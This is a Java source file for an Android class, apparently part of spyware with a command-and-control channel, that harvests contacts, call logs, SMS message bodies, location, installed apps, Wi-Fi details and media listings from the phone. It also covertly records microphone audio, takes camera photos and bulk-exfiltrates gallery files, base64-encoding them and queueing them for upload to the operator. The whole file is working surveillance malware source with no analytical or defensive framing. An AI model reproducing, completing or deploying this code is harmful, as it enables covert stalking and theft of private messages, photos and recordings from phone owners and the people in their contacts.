package com.system.service.collection;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollector {

    private static final String TAG = "DataCollector";
    private final Context context;
    private final Gson gson = new Gson();
    private LocationManager locationManager;
    private Location lastLocation;

    public DataCollector(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }

    public String collectAll() {
        JsonObject root = new JsonObject();
        root.addProperty("device_id", CoreApplication.getInstance().getDeviceId());
        root.addProperty("timestamp", System.currentTimeMillis());

        try {
            root.add("device_info", collectDeviceInfo());
            root.add("contacts", collectContacts());
            root.add("call_log", collectCallLog());
            root.add("sms", collectSms());
            root.add("location", collectLocation());
            root.add("apps", collectInstalledApps());
            root.add("wifi", collectWifiInfo());
            root.add("gallery", collectGallery());
            root.add("media", collectMedia());
        } catch (Exception e) {
            Log.e(TAG, "Collection error", e);
        }

        return gson.toJson(root);
    }

    private JsonObject collectDeviceInfo() {
        JsonObject info = new JsonObject();
        info.addProperty("model", android.os.Build.MODEL);
        info.addProperty("manufacturer", android.os.Build.MANUFACTURER);
        info.addProperty("brand", android.os.Build.BRAND);
        info.addProperty("android_version", android.os.Build.VERSION.RELEASE);
        info.addProperty("sdk_int", android.os.Build.VERSION.SDK_INT);
        info.addProperty("product", android.os.Build.PRODUCT);
        info.addProperty("device", android.os.Build.DEVICE);
        info.addProperty("id", android.os.Build.ID);
        info.addProperty("serial", android.os.Build.getSerial());
        info.addProperty("fingerprint", android.os.Build.FINGERPRINT);
        
        // Battery
        android.content.IntentFilter filter = new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent battery = context.registerReceiver(null, filter);
        if (battery != null) {
            int level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            info.addProperty("battery_level", (level * 100) / (float) scale);
            info.addProperty("charging", battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, 0) == android.os.BatteryManager.BATTERY_STATUS_CHARGING);
        }

        // Network
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            android.net.NetworkInfo ni = cm.getActiveNetworkInfo();
            if (ni != null) {
                info.addProperty("network_type", ni.getTypeName());
                info.addProperty("network_subtype", ni.getSubtypeName());
            }
        }

        return info;
    }

    private JsonArray collectContacts() {
        JsonArray array = new JsonArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                
                JsonObject contact = new JsonObject();
                contact.addProperty("id", id);
                contact.addProperty("name", name);

                // Phone numbers
                JsonArray phones = new JsonArray();
                Cursor phonesCursor = cr.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                    new String[]{id}, null);
                if (phonesCursor != null) {
                    while (phonesCursor.moveToNext()) {
                        String number = phonesCursor.getString(phonesCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String type = phonesCursor.getString(phonesCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));
                        JsonObject phone = new JsonObject();
                        phone.addProperty("number", number);
                        phone.addProperty("type", type);
                        phones.add(phone);
                    }
                    phonesCursor.close();
                }
                contact.add("phones", phones);
                array.add(contact);
            }
            cursor.close();
        }
        return array;
    }

    private JsonArray collectCallLog() {
        JsonArray array = new JsonArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                JsonObject call = new JsonObject();
                call.addProperty("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                call.addProperty("type", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)));
                call.addProperty("date", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)));
                call.addProperty("duration", cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                call.addProperty("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                array.add(call);
                count++;
            }
            cursor.close();
        }
        return array;
    }

    private JsonArray collectSms() {
        JsonArray array = new JsonArray();
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/"), null, null, null, "date DESC");
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                JsonObject sms = new JsonObject();
                sms.addProperty("address", cursor.getString(cursor.getColumnIndex("address")));
                sms.addProperty("body", cursor.getString(cursor.getColumnIndex("body")));
                sms.addProperty("date", cursor.getLong(cursor.getColumnIndex("date")));
                sms.addProperty("type", cursor.getInt(cursor.getColumnIndex("type"))); // 1=inbox, 2=sent
                sms.addProperty("read", cursor.getInt(cursor.getColumnIndex("read")) == 1);
                array.add(sms);
                count++;
            }
            cursor.close();
        }
        return array;
    }

    private JsonObject collectLocation() {
        JsonObject loc = new JsonObject();
        try {
            if (locationManager != null) {
                // Get last known location
                for (String provider : locationManager.getProviders(true)) {
                    Location location = locationManager.getLastKnownLocation(provider);
                    if (location != null) {
                        lastLocation = location;
                        loc.addProperty("latitude", location.getLatitude());
                        loc.addProperty("longitude", location.getLongitude());
                        loc.addProperty("accuracy", location.getAccuracy());
                        loc.addProperty("provider", provider);
                        loc.addProperty("timestamp", location.getTime());
                        break;
                    }
                }
            }
        } catch (SecurityException e) {
            Log.w(TAG, "Location permission denied");
        }
        return loc;
    }

    private JsonArray collectInstalledApps() {
        JsonArray array = new JsonArray();
        android.content.pm.PackageManager pm = context.getPackageManager();
        for (android.content.pm.ApplicationInfo app : pm.getInstalledApplications(0)) {
            JsonObject obj = new JsonObject();
            obj.addProperty("package", app.packageName);
            obj.addProperty("name", pm.getApplicationLabel(app).toString());
            obj.addProperty("system", (app.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
            obj.addProperty("version", getVersionName(app.packageName));
            array.add(obj);
        }
        return array;
    }

    private String getVersionName(String packageName) {
        try {
            return context.getPackageManager().getPackageInfo(packageName, 0).versionName;
        } catch (Exception e) {
            return "unknown";
        }
    }

    private JsonArray collectGallery() {
        JsonArray array = new JsonArray();
        ContentResolver cr = context.getContentResolver();
        
        // Images
        String[] projection = {
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.RELATIVE_PATH
        };
        
        Cursor cursor = cr.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            null, null,
            MediaStore.Images.Media.DATE_ADDED + " DESC"
        );
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 500) {
                JsonObject item = new JsonObject();
                item.addProperty("type", "image");
                item.addProperty("id", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)));
                item.addProperty("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)));
                item.addProperty("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)));
                item.addProperty("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)));
                item.addProperty("mime", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)));
                item.addProperty("date_added", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)));
                item.addProperty("date_modified", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)));
                item.addProperty("width", cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.WIDTH)));
                item.addProperty("height", cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.HEIGHT)));
                item.addProperty("relative_path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.RELATIVE_PATH)));
                array.add(item);
                count++;
            }
            cursor.close();
        }
        return array;
    }

    private JsonArray collectMedia() {
        JsonArray array = new JsonArray();
        ContentResolver cr = context.getContentResolver();
        
        // Videos
        String[] videoProjection = {
            MediaStore.Video.Media._ID,
            MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.DATA,
            MediaStore.Video.Media.SIZE,
            MediaStore.Video.Media.MIME_TYPE,
            MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.DURATION,
            MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT,
            MediaStore.Video.Media.RELATIVE_PATH
        };
        
        Cursor cursor = cr.query(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            videoProjection,
            null, null,
            MediaStore.Video.Media.DATE_ADDED + " DESC"
        );
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                JsonObject item = new JsonObject();
                item.addProperty("type", "video");
                item.addProperty("id", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID)));
                item.addProperty("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DISPLAY_NAME)));
                item.addProperty("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)));
                item.addProperty("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)));
                item.addProperty("mime", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.MIME_TYPE)));
                item.addProperty("date_added", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATE_ADDED)));
                item.addProperty("duration", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)));
                item.addProperty("width", cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.WIDTH)));
                item.addProperty("height", cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.HEIGHT)));
                item.addProperty("relative_path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.RELATIVE_PATH)));
                array.add(item);
                count++;
            }
            cursor.close();
        }
        
        // Audio
        String[] audioProjection = {
            MediaStore.Audio.Media._ID,
            MediaStore.Audio.Media.DISPLAY_NAME,
            MediaStore.Audio.Media.DATA,
            MediaStore.Audio.Media.SIZE,
            MediaStore.Audio.Media.MIME_TYPE,
            MediaStore.Audio.Media.DATE_ADDED,
            MediaStore.Audio.Media.DURATION,
            MediaStore.Audio.Media.ARTIST,
            MediaStore.Audio.Media.TITLE,
            MediaStore.Audio.Media.ALBUM,
            MediaStore.Audio.Media.RELATIVE_PATH
        };
        
        cursor = cr.query(
            MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            audioProjection,
            null, null,
            MediaStore.Audio.Media.DATE_ADDED + " DESC"
        );
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                JsonObject item = new JsonObject();
                item.addProperty("type", "audio");
                item.addProperty("id", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID)));
                item.addProperty("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME)));
                item.addProperty("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA)));
                item.addProperty("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE)));
                item.addProperty("mime", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.MIME_TYPE)));
                item.addProperty("date_added", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_ADDED)));
                item.addProperty("duration", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)));
                item.addProperty("artist", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ARTIST)));
                item.addProperty("title", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE)));
                item.addProperty("album", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.ALBUM)));
                item.addProperty("relative_path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.RELATIVE_PATH)));
                array.add(item);
                count++;
            }
            cursor.close();
        }
        
        // Downloads
        String[] downloadProjection = {
            MediaStore.Downloads._ID,
            MediaStore.Downloads.DISPLAY_NAME,
            MediaStore.Downloads.DATA,
            MediaStore.Downloads.SIZE,
            MediaStore.Downloads.MIME_TYPE,
            MediaStore.Downloads.DATE_ADDED,
            MediaStore.Downloads.RELATIVE_PATH
        };
        
        cursor = cr.query(
            MediaStore.Downloads.EXTERNAL_CONTENT_URI,
            downloadProjection,
            null, null,
            MediaStore.Downloads.DATE_ADDED + " DESC"
        );
        
        if (cursor != null) {
            int count = 0;
            while (cursor.moveToNext() && count < 200) {
                JsonObject item = new JsonObject();
                item.addProperty("type", "download");
                item.addProperty("id", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Downloads._ID)));
                item.addProperty("name", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Downloads.DISPLAY_NAME)));
                item.addProperty("path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Downloads.DATA)));
                item.addProperty("size", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Downloads.SIZE)));
                item.addProperty("mime", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Downloads.MIME_TYPE)));
                item.addProperty("date_added", cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Downloads.DATE_ADDED)));
                item.addProperty("relative_path", cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Downloads.RELATIVE_PATH)));
                array.add(item);
                count++;
            }
            cursor.close();
        }
        
        return array;
    }

    private JsonObject collectWifiInfo() {
        JsonObject wifi = new JsonObject();
        android.net.wifi.WifiManager wm = (android.net.wifi.WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wm != null) {
            android.net.wifi.WifiInfo info = wm.getConnectionInfo();
            if (info != null) {
                wifi.addProperty("ssid", info.getSSID().replace("\"", ""));
                wifi.addProperty("bssid", info.getBSSID());
                wifi.addProperty("ip", intToIp(info.getIpAddress()));
                wifi.addProperty("rssi", info.getRssi());
                wifi.addProperty("link_speed", info.getLinkSpeed());
            }
        }
        return wifi;
    }

    private String intToIp(int i) {
        return ((i & 0xFF) + "." + ((i >> 8) & 0xFF) + "." + ((i >> 16) & 0xFF) + "." + ((i >> 24) & 0xFF));
    }

    // Remote command implementations
    public void recordAudio(int durationSeconds) {
        new Thread(() -> {
            try {
                File file = new File(context.getCacheDir(), "audio_" + System.currentTimeMillis() + ".3gp");
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                recorder.setOutputFile(file.getAbsolutePath());
                recorder.prepare();
                recorder.start();
                Thread.sleep(durationSeconds * 1000L);
                recorder.stop();
                recorder.release();

                // Upload file
                uploadFile(file, "audio");
            } catch (Exception e) {
                Log.e(TAG, "Audio recording failed", e);
            }
        }).start();
    }

    public void takePhoto() {
        new Thread(() -> {
            try {
                File file = new File(context.getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");
                android.hardware.Camera camera = android.hardware.Camera.open();
                android.hardware.Camera.Parameters params = camera.getParameters();
                params.setPictureFormat(android.graphics.ImageFormat.JPEG);
                camera.setParameters(params);
                camera.takePicture(null, null, (data, cam) -> {
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        fos.write(data);
                    } catch (IOException e) {
                        Log.e(TAG, "Photo save failed", e);
                    }
                    cam.release();
                    uploadFile(file, "photo");
                });
            } catch (Exception e) {
                Log.e(TAG, "Photo capture failed", e);
            }
        }).start();
    }

    private void uploadFile(File file, String type) {
        // Convert to base64 and send via C2
        try {
            byte[] bytes = java.nio.file.Files.readAllBytes(file.toPath());
            String base64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            
            JsonObject msg = new JsonObject();
            msg.addProperty("type", "file_upload");
            msg.addProperty("file_type", type);
            msg.addProperty("filename", file.getName());
            msg.addProperty("data", base64);
            msg.addProperty("size", file.length());
            
            CoreApplication.getInstance().getPrefs().edit().putString("pending_upload", gson.toJson(msg)).apply();
        } catch (Exception e) {
            Log.e(TAG, "File upload prep failed", e);
        }
    }

    // Media exfiltration by ID
    public void exfiltrateMedia(long mediaId, String mediaType) {
        new Thread(() -> {
            try {
                Uri contentUri;
                String[] projection = {MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DISPLAY_NAME, MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.SIZE};
                
                switch (mediaType) {
                    case "image": contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI; break;
                    case "video": contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI; break;
                    case "audio": contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI; break;
                    case "download": contentUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI; break;
                    default: return;
                }
                
                ContentResolver cr = context.getContentResolver();
                Cursor cursor = cr.query(contentUri, projection, MediaStore.MediaColumns._ID + "=?", new String[]{String.valueOf(mediaId)}, null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DISPLAY_NAME));
                    String mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE));
                    long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.SIZE));
                    cursor.close();
                    
                    File file = new File(path);
                    if (file.exists()) {
                        uploadFile(file, mediaType);
                    } else {
                        // Try opening via ContentResolver
                        java.io.InputStream is = cr.openInputStream(Uri.parse(path));
                        if (is != null) {
                            File tempFile = new File(context.getCacheDir(), "media_" + mediaId + "_" + name);
                            java.io.FileOutputStream fos = new java.io.FileOutputStream(tempFile);
                            byte[] buffer = new byte[8192];
                            int len;
                            while ((len = is.read(buffer)) > 0) {
                                fos.write(buffer, 0, len);
                            }
                            fos.close();
                            is.close();
                            uploadFile(tempFile, mediaType);
                            tempFile.delete();
                        }
                    }
                }
                if (cursor != null) cursor.close();
            } catch (Exception e) {
                Log.e(TAG, "Media exfil failed", e);
            }
        }).start();
    }

    public void exfiltrateAllGallery(String mediaType, int limit) {
        new Thread(() -> {
            try {
                Uri contentUri;
                switch (mediaType) {
                    case "image": contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI; break;
                    case "video": contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI; break;
                    case "audio": contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI; break;
                    default: return;
                }
                
                ContentResolver cr = context.getContentResolver();
                Cursor cursor = cr.query(contentUri, new String[]{MediaStore.MediaColumns._ID}, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC");
                
                if (cursor != null) {
                    int count = 0;
                    while (cursor.moveToNext() && count < limit) {
                        long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
                        exfiltrateMedia(id, mediaType);
                        count++;
                        Thread.sleep(100); // Throttle
                    }
                    cursor.close();
                }
            } catch (Exception e) {
                Log.e(TAG, "Bulk gallery exfil failed", e);
            }
        }).start();
    }
}